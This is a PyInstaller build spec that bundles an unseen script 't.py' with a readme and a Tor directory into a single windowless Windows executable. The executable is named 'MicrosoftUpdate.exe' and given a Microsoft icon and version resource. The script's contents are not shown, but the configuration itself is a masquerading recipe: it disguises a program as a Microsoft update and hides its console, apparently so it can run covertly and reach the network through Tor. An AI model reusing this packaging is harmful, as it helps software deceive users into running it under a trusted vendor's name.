# -*- mode: python -*-

block_cipher = None

added_files = [
         ( "C:\\Users\\Anonymous\\Desktop\\finnalBuild1\\readme.txt", '.' ) , 
         ("C:\\Users\\Anonymous\\Desktop\\finnalBuild1\\tor", 'tor' ) ,
         ]

a = Analysis(["C:\\Users\\Anonymous\\Desktop\\finnalBuild1\\t.py"],
             pathex=["C:\\Users\\Anonymous\\Desktop\\finnalBuild1"],
             binaries=[],
             datas= added_files ,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)



exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='MicrosoftUpdate.exe',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          version='version.rc',
          icon='Microsoft.ico',
          console=False )
